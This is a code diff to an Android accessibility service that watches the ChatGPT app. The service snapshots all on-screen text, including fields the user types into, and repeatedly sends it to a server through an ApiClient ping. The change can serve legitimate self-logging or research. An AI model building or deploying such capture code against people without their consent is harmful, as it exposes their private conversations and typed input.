@@ -22,6 +22,8 @@ public class CaptureAccessibilityService extends AccessibilityService {
     private String pendingUser="";
     private String lastUser="";
     private String assistantCandidate="";
+    private String lastWindowDigest="";
+    private long lastSnapshotPingAt=0;
     private long candidateChangedAt=0;
     private boolean awaitingAssistant=false;
     private String conversationId="";
@@ -54,12 +56,20 @@ public class CaptureAccessibilityService extends AccessibilityService {
         if(!CHATGPT_PACKAGE.contentEquals(event.getPackageName())) return;
 
         try {
-            JSONObject d=new JSONObject();
-            d.put("kind","accessibility_event");
-            d.put("eventType",String.valueOf(event.getEventType()));
-            d.put("packageName",String.valueOf(event.getPackageName()));
-            d.put("text",nodeText(event.getSource()));
-            ApiClient.ping(this,d);
+            long now=System.currentTimeMillis();
+            AccessibilityNodeInfo root=getRootInActiveWindow();
+            String snapshot=root==null?"":windowSnapshot(root);
+            String digest=hash(snapshot);
+            if(now-lastSnapshotPingAt>800 || !digest.equals(lastWindowDigest)) {
+                JSONObject d=new JSONObject();
+                d.put("kind","window_snapshot");
+                d.put("eventType",String.valueOf(event.getEventType()));
+                d.put("packageName",String.valueOf(event.getPackageName()));
+                d.put("text",snapshot.length()>3500?snapshot.substring(0,3500):snapshot);
+                ApiClient.ping(this,d);
+                lastSnapshotPingAt=now;
+                lastWindowDigest=digest;
+            }
         } catch(Exception ignored){}
 
         int type=event.getEventType();
@@ -217,6 +227,21 @@ public class CaptureAccessibilityService extends AccessibilityService {
         if(t!=null && t.length()>0) return t.toString();
         CharSequence d=n.getContentDescription();
         return d==null?"":d.toString();
+    }
+
+    private String windowSnapshot(AccessibilityNodeInfo root) {
+        ArrayList<NodeText> nodes=new ArrayList<>();
+        collect(root,nodes);
+        StringBuilder sb=new StringBuilder();
+        int i=0;
+        for(NodeText n:nodes) {
+            String t=n.text==null?"":n.text.trim();
+            if(t.isEmpty()) continue;
+            if(sb.length()>0) sb.append("\n");
+            sb.append(i++).append("|").append(n.editable?"E":"T").append("|").append(t.replace("\n"," ↵ "));
+            if(sb.length()>5000) break;
+        }
+        return sb.toString();
     }
 
     private boolean isUiText(String s) {
